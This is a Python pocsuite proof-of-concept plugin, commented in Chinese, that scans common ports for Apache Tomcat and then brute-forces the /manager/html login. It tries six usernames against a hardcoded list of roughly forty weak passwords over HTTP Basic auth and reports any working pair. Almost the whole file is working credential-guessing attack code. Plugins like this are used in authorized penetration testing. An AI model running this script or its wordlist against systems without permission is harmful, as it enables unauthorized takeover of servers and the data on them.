#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
import re
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
#pg数据库
class TomcatPOC(POCBase):
    vulID = '34'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-05-17' #漏洞公开的时间,不知道就写今天

    author = 'xiaohuihui1' #  PoC作者的大名
    createDate ='2018-05-17'# 编写 PoC 的日期
    updateDate = '2018-05-17'# PoC 更新的时间,默认和编写时间一样
    references = ['https://bbs.ichunqiu.com/thread-15983-1-1.html']# 漏洞地址来源,0day不用写
    name = 'tomcat weakpass'# PoC 名称
    appPowerLink = 'https://tomcat.apache.org/'# 漏洞厂商主页地址
    appName = 'tomcat weakpass'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'weak pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        tomcat weakpass
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['base64'] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        
    #验证模块
    def _verify(self):

        result={}
        output = Output(self)

        port=""

        vul_url = '%s' % self.url

        password = ['123456', 'admin', 'root', 'password', '123123', '123', '1', '',
                    'P@ssw0rd!!', 'qwa123', '12345678', 'test', '123qwe!@#',
                    '123456789', '123321', '1314520', '666666', 'woaini', 'fuckyou', '000000',
                    '1234567890', '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456',
                    '1q2w3e4r', '123qwe', '159357', 'p@ssw0rd', 'p@55w0rd', 'password!',
                    'p@ssw0rd!', 'password1', 'r00t', 'system', '111111', 'admin']

        user = ["root","admin", "tomcat", "Tomcat", "test", "manager"]


        list_a = [8080, 8090,9080,9090,80] #tomcat常见端口列表
        for one_port in list_a:
            try:
                is_tomcat_url =(vul_url+":"+str(one_port)).strip("/").strip("/").strip(":")

                #"/manager/html").replace('//mana','/')
                print is_tomcat_url

                reponse = req.get(is_tomcat_url,timeout=3)
                if ("installed Tomcat. Congratulations!" in reponse.text):

                    port = str(one_port)
                    print '发现特征，确定Tomcat端口：'+port

                    vul_url = is_tomcat_url
                    print "确定vul_url"+vul_url

                    break
                else:
                    print "not:"+str(one_port)

            except Exception as e:
                print e
                pass

        if (port == ""):
            print '无漏洞，未发现tomcat端口'
            return self.save_output(result)

        #确定port和vul_url了
        vul_url = vul_url+"/manager/html"
        print "final"+vul_url
        #http://1.1.1.1:9080:9080/manager/html


        import base64
        #import time
        for u in user:
            for p in password:
                try:
                    #time.sleep(2)
                    header = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
                        "Authorization": " Basic " + base64.b64encode(("%s:%s") % (u, p))}

                    print '当前  '+u+":"+p

                    reponse = req.get(vul_url , timeout=5, headers=header)
                    if ("Tomcat Web Application Manager" in reponse.text):
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = vul_url
                        result['VerifyInfo']['Payload'] = u + ":" + p
                except Exception as e:
                    print e
                    pass
        print '[+]34 poc done'
        return self.save_output(result)






    #攻击模块
    def _attack(self):
        pass

    #输出报告
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(TomcatPOC)
